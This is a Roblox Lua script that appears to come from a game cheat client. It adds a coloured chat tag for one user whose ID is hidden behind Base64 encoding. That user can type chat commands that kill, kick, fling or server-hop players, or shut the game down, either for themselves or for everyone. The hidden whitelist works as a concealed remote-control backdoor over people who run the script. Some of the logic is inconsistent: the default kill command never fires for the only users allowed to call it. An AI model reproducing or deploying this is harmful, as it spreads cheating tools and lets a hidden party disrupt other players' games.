local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")
local TeleportService = game:GetService("TeleportService")
local EncodingService = game:GetService("EncodingService")


--// Configuration

local List = {
	["NzA5NjU1OTYzOA=="] = {
		Title = "LUNAR PRIVATE",
		ColorCode = Color3.fromRGB(169, 94, 255),

		Commands = true,
		commandSuperiority = false,
	},
}


--// Authorized users

local UserData = {}

for encodedUserId, data in pairs(List) do
	local success, decodedUserId = pcall(function()
		return EncodingService:Base64Decode(encodedUserId)
	end)

	if success then
		local userId = tonumber(decodedUserId)

		if userId then
			UserData[userId] = data
		end
	end
end


--// Helpers

local function ResetCharacter(player)
	if player.Character then
		player.Character:BreakJoints()
	end
end


local function GetCharacterRoot(player)
	local character = player.Character

	if not character then
		return nil
	end

	return character:FindFirstChild("HumanoidRootPart")
end


local function FlingPlayer(player)
	local root = GetCharacterRoot(player)

	if not root then
		return
	end

	root.AssemblyLinearVelocity = Vector3.new(
		math.random(-150, 150),
		-250,
		math.random(-150, 150)
	)

	root.AssemblyAngularVelocity = Vector3.new(
		math.random(-50, 50),
		math.random(-50, 50),
		math.random(-50, 50)
	)
end


local function ServerHop(player)
	TeleportService:Teleport(game.PlaceId, player)
end


local function ServerHopAll()
	for _, player in Players:GetPlayers() do
		ServerHop(player)
	end
end


--// Commands
--
-- Every command has:
--     default = affects the command sender
--     all     = affects everybody and requires commandSuperiority

local Commands = {

	kill = {

		default = {
			Superiority = false,

			Execute = function(player)
				if not UserData[player.UserId] then
					ResetCharacter(player)
				end
			end,
		},

		all = {
			Superiority = true,

			Execute = function()
				for _, player in Players:GetPlayers() do
					ResetCharacter(player)
				end
			end,
		},
	},


	reveal = {

		default = {
			Superiority = false,

			Execute = function()
				local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")

				if channel then
					channel:DisplaySystemMessage(
						"I am using some funky cheats client."
					)
				end
			end,
		},

		all = {
			Superiority = true,

			Execute = function()
				local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")

				if channel then
					channel:DisplaySystemMessage(
						"I am using some funky cheats client."
					)
				end
			end,
		},
	},


	shutdown = {

		default = {
			Superiority = false,

			Execute = function()
				game:Shutdown()
			end,
		},

		all = {
			Superiority = true,

			Execute = function()
				game:Shutdown()
			end,
		},
	},


	leave = {

		default = {
			Superiority = false,

			Execute = function(player)
				player:Kick("You have been disconnected from the server.")
			end,
		},

		all = {
			Superiority = true,

			Execute = function()
				for _, player in Players:GetPlayers() do
					player:Kick("You have been disconnected from the server.")
				end
			end,
		},
	},


	shop = {

		default = {
			Superiority = false,

			Execute = function(player)
				ServerHop(player)
			end,
		},

		all = {
			Superiority = true,

			Execute = function()
				ServerHopAll()
			end,
		},
	},


	void = {

		default = {
			Superiority = false,

			Execute = function(player)
				FlingPlayer(player)
			end,
		},

		all = {
			Superiority = true,

			Execute = function()
				for _, player in Players:GetPlayers() do
					FlingPlayer(player)
				end
			end,
		},
	},

}


--// Command handler

local function HandleCommand(player, message, data)
	if not data or not data.Commands then
		return
	end

	local arguments = string.split(message:lower(), " ")

	local commandName = arguments[1]:gsub("^%.", "")
	local parameter = arguments[2] or "default"

	local command = Commands[commandName]

	if not command then
		return
	end

	-- Only default/all are valid parameters.
	if parameter ~= "default" and parameter ~= "all" then
		return
	end

	local action = command[parameter]

	if not action then
		return
	end

	-- "all" actions require superiority.
	if action.Superiority and not data.commandSuperiority then
		return
	end

	action.Execute(player)
end


--// Chat

TextChatService.OnIncomingMessage = function(message)
	local properties = Instance.new("TextChatMessageProperties")

	if not message.TextSource then
		return properties
	end

	local player = Players:GetPlayerByUserId(message.TextSource.UserId)

	if not player then
		return properties
	end

	local data = UserData[player.UserId]

	if not data then
		return properties
	end

	print(string.format(
		"[%s] %s: %s",
		data.Title,
		player.Name,
		message.Text
		))

	HandleCommand(player, message.Text, data)

	local color = data.ColorCode

	properties.PrefixText = string.format(
		'<font color="rgb(%d,%d,%d)">[%s]</font> %s',
		math.floor(color.R * 255),
		math.floor(color.G * 255),
		math.floor(color.B * 255),
		data.Title,
		message.PrefixText or player.DisplayName
	)

	return properties
end
